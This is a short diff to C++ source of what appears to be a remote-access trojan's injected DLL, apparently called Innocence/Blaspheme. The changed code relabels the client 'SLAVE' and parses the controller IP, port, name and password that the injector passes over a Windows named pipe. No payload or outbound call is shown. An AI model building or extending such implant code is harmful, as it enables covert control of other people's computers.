@@ -14,7 +14,6 @@ using namespace System;
 
 void launch()
 {
-    FUNC_LOG(__FUNCTION__);
     LOG << "Connections...";
     while(true)
     {
@@ -39,31 +38,32 @@ void launch()
 
 DWORD WINAPI Run(void)
 {
-	LOG.setHeader("DLL_CLIENT");
-    /*
+	LOG.setHeader("SLAVE");
 #ifdef INNOCENCE_DEBUG
-    LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 100));
-    LOG << "Test validation injection OK.";
+    //LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 80));
 #endif
-    */
 
 	// il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
     // nous envoyer l'injecteur
     // pour ce faire, on utilise les "pipe" à la windows (IPC)
     Network::Pipe pipe_client;
     Blaspheme::ConnectionInfo infos;
-    char connection_infos [Blaspheme::DEFAULT_STR_SIZE];
-    
+    char blaspheme [Blaspheme::DEFAULT_STR_SIZE];
     if(pipe_client.connect(PIPE_NAME))
     {
-        pipe_client.recv((char*)&connection_infos, sizeof(connection_infos));
-        std::string buffer = connection_infos;
+        pipe_client.recv(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
+        std::string buffer(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
+		size_t end = buffer.find_last_of(MARKER);
+		buffer = buffer.substr(MARKER_SIZE, end+1-2*MARKER_SIZE);
+
         std::string port_buffer;
         std::istringstream iss(buffer);
+
         std::getline( iss, infos.ip, SEPERATOR );
         std::getline( iss, port_buffer, SEPERATOR );
         std::getline( iss, infos.name, SEPERATOR );
         std::getline( iss, infos.password, SEPERATOR );
+
         from_string(port_buffer, infos.port);
         pipe_client.disconnect();
     }
